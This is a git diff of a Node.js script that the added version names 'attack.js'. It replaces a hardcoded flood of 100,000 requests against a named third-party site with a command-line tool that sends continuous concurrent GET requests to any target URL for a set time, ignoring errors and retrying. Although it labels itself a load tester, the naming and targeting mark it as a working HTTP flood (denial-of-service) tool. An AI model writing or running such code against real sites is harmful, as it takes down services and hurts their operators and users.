@@ -1,44 +1,49 @@
-const axios = require('axios');
+// attack.js
+const http = require('http');
+const https = require('https');
+const { URL } = require('url');
 
-// Configuration
-const TARGET_URL = 'https://lookthefuture.com/'; // Change this to the target URL
-const CONCURRENT_REQUESTS = 1000; // Number of concurrent requests to send
-const TOTAL_REQUESTS = 100000; // Total requests to send
+if (process.argv.length < 4) {
+  console.log('USAGE: node attack.js https://target.com time_in_seconds');
+  process.exit(1);
+}
 
-// Function to send HTTP requests
-const sendRequest = async () => {
-  try {
-    const response = await axios.get(TARGET_URL);
-    console.log(`Request sent: Status ${response.status}`);
-  } catch (error) {
-    console.error(`Request failed: ${error.message}`);
+const target = new URL(process.argv[2]);
+const duration = parseInt(process.argv[3]) * 1000;
+const endTime = Date.now() + duration;
+
+const isHttps = target.protocol === 'https:';
+const client = isHttps ? https : http;
+
+const options = {
+  hostname: target.hostname,
+  port: target.port || (isHttps ? 443 : 80),
+  path: target.pathname + target.search,
+  method: 'GET',
+  headers: {
+    'User-Agent': 'LoadTester/1.0',
+    'Connection': 'keep-alive'
   }
 };
 
-// Function to perform load testing
-const performLoadTest = () => {
-  const requestPromises = [];
+function sendRequest() {
+  if (Date.now() > endTime) return;
 
-  // Create requests in batches
-  for (let i = 0; i < TOTAL_REQUESTS; i++) {
-    requestPromises.push(sendRequest());
-    
-    // If the number of concurrent requests reaches the limit, wait for all to finish
-    if (requestPromises.length >= CONCURRENT_REQUESTS) {
-      Promise.all(requestPromises).then(() => {
-        console.log(`${CONCURRENT_REQUESTS} requests completed.`);
-        requestPromises.length = 0; // Reset the request queue
-      });
-    }
-  }
+  const req = client.request(options, res => {
+    // Ignore response body
+    res.on('data', () => {});
+    res.on('end', sendRequest); // Send next request when done
+  });
 
-  // Handle remaining requests that are less than the concurrent limit
-  if (requestPromises.length > 0) {
-    Promise.all(requestPromises).then(() => {
-      console.log('All requests completed.');
-    });
-  }
-};
+  req.on('error', () => {
+    // Ignore errors and keep going
+    sendRequest();
+  });
 
-// Run the load test
-performLoadTest();
+  req.end();
+}
+
+const concurrent = 100;
+for (let i = 0; i < concurrent; i++) {
+  sendRequest();
+}
